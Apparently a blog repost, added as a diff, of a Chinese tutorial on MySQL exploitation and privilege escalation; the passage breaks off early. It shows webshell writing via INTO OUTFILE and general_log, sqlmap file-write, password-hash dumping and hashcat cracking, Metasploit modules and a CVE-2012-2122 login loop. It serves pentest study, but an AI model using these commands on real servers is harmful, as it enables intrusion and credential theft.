@@ -1,0 +1,1022 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="文章作者: 国光 文章链接: https:&#x2F;&#x2F;www.sqlsec.com&#x2F;2020&#x2F;11&#x2F;mysql.html 版权声明: 本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明来自 国光！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="转载 - MySQL 漏洞利用与提权">
+<meta property="og:url" content="https://sh1yan.top/2024/04/07/mysql-Raising-rights/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="文章作者: 国光 文章链接: https:&#x2F;&#x2F;www.sqlsec.com&#x2F;2020&#x2F;11&#x2F;mysql.html 版权声明: 本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明来自 国光！">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057446446922.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057458409201.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057587301960.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057589592021.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16042389608666.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16042411877187.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16042478578910.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16055961029549.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057508091895.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057523959536.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057511437230.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057520384495.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057523604421.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057524473020.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057526319645.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057546316568.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057552542660.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16056293813642.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057532596683.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057598832602.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057604132227.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057848805997.png">
+<meta property="og:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057855918281.png">
+<meta property="article:published_time" content="2024-04-07T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-04-07T02:59:06.494Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="mysql">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/mysql-Raising-rights/16057446446922.png">
+  
+  
+  
+  <title>转载 - MySQL 漏洞利用与提权 - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="转载 - MySQL 漏洞利用与提权"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-04-07 23:50" pubdate>
+          2024年4月7日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          73k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          612 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">转载 - MySQL 漏洞利用与提权</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><strong>文章作者:</strong> <a target="_blank" rel="noopener" href="https://www.sqlsec.com/">国光</a></p>
+<p><strong>文章链接:</strong> <a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p>
+<p><strong>版权声明:</strong> 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a target="_blank" rel="noopener" href="https://www.sqlsec.com/">国光</a>！</p>
+<span id="more"></span>
+
+<p>自从接触安全以来就 MySQL 的 UDF 提权、MOF 提权耳熟能详，但是貌似国光我一直都没有单独总结过这些零散的姿势点，所以本文就诞生了，再解决自己以前的困扰之余，也希望本文可以帮助到其他网友。</p>
+<h1 id="权限获取"><a href="#权限获取" class="headerlink" title="权限获取"></a>权限获取</h1><h2 id="数据库操作权限"><a href="#数据库操作权限" class="headerlink" title="数据库操作权限"></a>数据库操作权限</h2><p>本文讲的是 MySQL 提权相关知识，但是提权之前得先拿到高权限的 MySQL 用户才可以，拿到 MySQL 的用户名和密码的方式多种多样，但是不外乎就下面几种方法：</p>
+<ol>
+<li>MySQL 3306 端口弱口令爆破</li>
+<li>sqlmap 注入的 <code>--sql-shell</code> 模式</li>
+<li>网站的数据库配置文件中拿到明文密码信息</li>
+<li>CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限</li>
+</ol>
+<h2 id="Webshell-权限"><a href="#Webshell-权限" class="headerlink" title="Webshell 权限"></a>Webshell 权限</h2><h3 id="into-oufile-写-shell"><a href="#into-oufile-写-shell" class="headerlink" title="into oufile 写 shell"></a>into oufile 写 shell</h3><ul>
+<li>知道网站物理路径</li>
+<li>高权限数据库用户</li>
+<li>load_file () 开启 即 secure_file_priv 无限制</li>
+<li>网站路径有写入权限</li>
+</ul>
+<p>首先基础语法查询是否 secure_file_priv 没有限制</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">SQL<br><span class="hljs-section">mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="hljs-section">+------------------+-------+</span><br><span class="hljs-section">| Variable_name    | Value |</span><br><span class="hljs-section">+------------------+-------+</span><br><span class="hljs-section">| secure_file_priv |       |</span><br><span class="hljs-section">+------------------+-------+</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">|<span class="hljs-string"> Value </span>|<span class="hljs-string"> 说明                       </span>|<br>|<span class="hljs-string"> ----- </span>|<span class="hljs-string"> -------------------------- </span>|<br>|<span class="hljs-string"> NULL  </span>|<span class="hljs-string"> 不允许导入或导出           </span>|<br>|<span class="hljs-string"> /tmp  </span>|<span class="hljs-string"> 只允许在 /tmp 目录导入导出 </span>|<br>|<span class="hljs-string"> 空    </span>|<span class="hljs-string"> 不限制目录                 </span>|<br><br>&gt; 在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件<br>&gt;<br>&gt; 在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件<br><br>如果满足上述所有条件的话，那么可以尝试使用下面原生的 SQL 语句来直接写 shell：<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">BASH</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; into outfile &#x27;/var/www/html/info.php&#x27;;</span><br></code></pre></td></tr></table></figure>
+
+<p>sqlmap 中可以如下操作：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">BASH<br>sqlmap -u <span class="hljs-string">&quot;http://x.x.x.x/?id=x&quot;</span> --<span class="hljs-keyword">file</span>-<span class="hljs-keyword">write</span>=<span class="hljs-string">&quot;/Users/guang/Desktop/shell.php&quot;</span> --<span class="hljs-keyword">file</span>-dest=<span class="hljs-string">&quot;/var/www/html/test/shell.php&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。</p>
+<h3 id="日志文件写-shell"><a href="#日志文件写-shell" class="headerlink" title="日志文件写 shell"></a>日志文件写 shell</h3><ul>
+<li>Web 文件夹宽松权限可以写入</li>
+<li>Windows 系统下</li>
+<li>高权限运行 MySQL 或者 Apache</li>
+</ul>
+<p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">BASH<br><span class="hljs-section">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="hljs-section">+------------------+---------------------------------+</span><br><span class="hljs-section">| Variable_name    | Value                           |</span><br><span class="hljs-section">+------------------+---------------------------------+</span><br>| general<span class="hljs-emphasis">_log      | OFF                             |</span><br><span class="hljs-emphasis">| general_log_</span>file | /var/lib/mysql/c1595d3a029a.log |<br><span class="hljs-code">+------------------+</span>---------------------------------+<br></code></pre></td></tr></table></figure>
+
+<p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p>
+<p>可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs awk">BASH<br><br><span class="hljs-comment"># 更改日志文件位置</span><br>set global general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br>set global general_log_file=<span class="hljs-string">&#x27;/var/www/html/info.php&#x27;</span>;<br><br><span class="hljs-comment"># 查看当前配置</span><br>mysql&gt; SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span>;<br>+------------------+-----------------------------+<br>| Variable_name    | Value                       |<br>+------------------+-----------------------------+<br>| general_log      | ON                          |<br>| general_log_file | <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>nfo.php |<br>+------------------+-----------------------------+<br><br><span class="hljs-comment"># 往日志里面写入 payload</span><br>select <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;<br><br><span class="hljs-comment"># 此时已经写到 info.php 文件当中了</span><br>root@c1595d3a029a:<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>$ cat info.php <br><span class="hljs-regexp">/usr/</span>sbin/mysqld, Version: <span class="hljs-number">5.5</span>.<span class="hljs-number">61</span>-<span class="hljs-number">0</span>ubuntu0.<span class="hljs-number">14.04</span>.<span class="hljs-number">1</span> ((Ubuntu)). started with:<br>Tcp port: <span class="hljs-number">3306</span>  Unix socket: <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/mysqld/my</span>sqld.sock<br>Time                 Id Command    Argument<br><span class="hljs-number">201031</span> <span class="hljs-number">21</span>:<span class="hljs-number">14</span>:<span class="hljs-number">46</span>       <span class="hljs-number">40</span> Query    SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span><br><span class="hljs-number">201031</span> <span class="hljs-number">21</span>:<span class="hljs-number">15</span>:<span class="hljs-number">34</span>       <span class="hljs-number">40</span> Query    select <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ：</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">BASH<br>-rw-rw----<span class="hljs-number"> 1 </span>mysql mysql<span class="hljs-number"> 293 </span>Oct<span class="hljs-number"> 31 </span>21:15 info.php<br></code></pre></td></tr></table></figure>
+
+<p>Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些，不过这里还是可以当做小知识点来学习记录。</p>
+<p>前面分别介绍了数据库权限和 Webshell 权限，那么能不能利用已经获取到的 MySQL 权限来执行系统主机的命令的呢？这个就是下面主要介绍的了 MySQL 提权的知识点了。</p>
+<h2 id="Hash-获取与解密"><a href="#Hash-获取与解密" class="headerlink" title="Hash 获取与解密"></a>Hash 获取与解密</h2><p>假设存在 SQL 注入 DBA 权限，如果目标 3306 端口也是可以访问通的话，可以尝试读取 MySQL 的 Hash 来解密：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">SQL<br><br># MySQL &lt;= 5.6 版本<br><span class="hljs-section">mysql&gt; select host, user, password from mysql.user;</span><br><span class="hljs-section">+-----------+------+-------------------------------------------+</span><br><span class="hljs-section">| host      | user | password                                  |</span><br><span class="hljs-section">+-----------+------+-------------------------------------------+</span><br>| localhost | root | <span class="hljs-strong">*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="hljs-strong">| 127.0.0.1 | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="hljs-strong">| ::1       | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="hljs-strong">| %         | root | *</span>81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |<br><span class="hljs-code">+-----------+</span>------<span class="hljs-code">+-------------------------------------------+</span><br><br># MySQL &gt;= 5.7 版本<br><span class="hljs-section">mysql &gt; select host,user,authentication_string from mysql.user;</span><br><span class="hljs-section">+-----------+---------------+-------------------------------------------+</span><br><span class="hljs-section">| host      | user          | authentication_string                     |</span><br><span class="hljs-section">+-----------+---------------+-------------------------------------------+</span><br>| localhost | root          | <span class="hljs-strong">*8232A1298A49F710DBEE0B330C42EEC825D4190A |</span><br><span class="hljs-strong">| localhost | mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="hljs-strong">| localhost | mysql.sys     | *</span>THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |<br><span class="hljs-code">+-----------+</span>---------------<span class="hljs-code">+-------------------------------------------+</span><br></code></pre></td></tr></table></figure>
+
+<p>获取到的 MySQL Hash 值可以通过一些在线网站来解密，如国内的 CMD5 ：</p>
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057446446922.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057446446922.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">BASH<br>hashcat -a <span class="hljs-number">0</span> -m <span class="hljs-number">300</span> --force &#x27;<span class="hljs-number">8232</span>A<span class="hljs-number">1298</span>A49F710DBEE0B330C42EEC825D<span class="hljs-number">4190</span>A&#x27; password.txt -O<br></code></pre></td></tr></table></figure>
+
+<p><strong>-a 破解模式</strong></p>
+<p>指定要使用的破解模式，其值参考后面对参数</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">R<br>- [ Attack Modes ] -<br><br>  <span class="hljs-comment"># | Mode</span><br> ===+======<br> <span class="hljs-number"> 0 </span>| Straight                <span class="hljs-comment"># 直接字典破解</span><br> <span class="hljs-number"> 1 </span>| Combination             <span class="hljs-comment"># 组合破解</span><br> <span class="hljs-number"> 3 </span>| Brute-force             <span class="hljs-comment"># 掩码暴力破解</span><br> <span class="hljs-number"> 6 </span>| Hybrid Wordlist + Mask  <span class="hljs-comment"># 字典+掩码破解</span><br> <span class="hljs-number"> 7 </span>| Hybrid Mask + Wordlist  <span class="hljs-comment"># 掩码+字典破解</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>-m 破解 hash 类型</strong></p>
+<p>指定要破解的 hash 类型，后面跟 hash 类型对应的数字，具体类型详见下表：</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs coq">BASH<br><span class="hljs-number">12</span>   | <span class="hljs-type">PostgreSQL</span>                                       | <span class="hljs-type">Database</span> Server<br><span class="hljs-number">131</span>  | <span class="hljs-type">MSSQL</span> (<span class="hljs-number">2000</span>)                                     | <span class="hljs-type">Database</span> Server<br><span class="hljs-number">132</span>  | <span class="hljs-type">MSSQL</span> (<span class="hljs-number">2005</span>)                                     | <span class="hljs-type">Database</span> Server<br><span class="hljs-number">1731</span> | <span class="hljs-type">MSSQL</span> (<span class="hljs-number">2012</span>, <span class="hljs-number">2014</span>)                               | <span class="hljs-type">Database</span> Server<br><span class="hljs-number">200</span>  | <span class="hljs-type">MySQL323</span>                                         | <span class="hljs-type">Database</span> Server<br><span class="hljs-number">300</span>  | <span class="hljs-type">MySQL4</span><span class="hljs-number">.1</span>/MySQL5                                  | <span class="hljs-type">Database</span> Server<br>...<br></code></pre></td></tr></table></figure>
+
+<p><strong>–force</strong></p>
+<p>忽略破解过程中的警告信息</p>
+<p><strong>-O</strong></p>
+<p><code>--optimized-kernel-enable</code> 启用优化的内核（限制密码长度）</p>
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057458409201.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057458409201.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<blockquote>
+<p>关于更多 Hashcat 的详细教程可以参考国光我的这一篇文章：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2019/10/hashcat.html">Hashcat 学习记录</a></p>
+</blockquote>
+<h2 id="MySQL-历史上的漏洞"><a href="#MySQL-历史上的漏洞" class="headerlink" title="MySQL 历史上的漏洞"></a>MySQL 历史上的漏洞</h2><h3 id="yaSSL-缓冲区溢出"><a href="#yaSSL-缓冲区溢出" class="headerlink" title="yaSSL 缓冲区溢出"></a>yaSSL 缓冲区溢出</h3><p>MySQL yaSSL SSL Hello Message Buffer Overflow 这个缓冲区溢出漏洞 2008 年开始被曝出来，距离现在已经十几年的历史了，所以国光这里没有找到对应的环境测试，不过 MSF 里面已经集成好了对应的模块了：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">BASH<br>msf6 &gt; use exploit<span class="hljs-regexp">/windows/my</span>sql/mysql_yassl_hello<br>msf6 &gt; use exploit<span class="hljs-regexp">/linux/my</span>sql/mysql_yassl_hello<br></code></pre></td></tr></table></figure>
+
+<p>有条件的朋友可以搭建这个漏洞对应的靶场环境</p>
+<p><strong>Linux</strong> : MySQL 5.0.45-Debian_1ubuntu3.1-log</p>
+<p><strong>Windows</strong> : MySQL 5.0.45-community-nt</p>
+<h3 id="CVE-2012-2122"><a href="#CVE-2012-2122" class="headerlink" title="CVE-2012-2122"></a>CVE-2012-2122</h3><p>知道用户名多次输入错误的密码会有几率可以直接成功登陆进数据库，可以循环 1000 次登陆数据库：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">BASH</span><br><span class="hljs-attribute">for</span> i in `seq <span class="hljs-number">1</span> <span class="hljs-number">1000</span>`; do mysql -uroot -pwrong -h <span class="hljs-number">127.0.0.1</span> -P3306 ; done<br></code></pre></td></tr></table></figure>
+
+<p><a href="http://sh1yan.top/photo/mysql-Raising-rights/16057587301960.png"><img src="http://sh1yan.top/photo/mysql-Raising-rights/16057587301960.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>MSF 里面也有了对应的脚本模块可以直接使用，成功后会直接 DUMP 出 MySQL 的 Hash 值：</p>
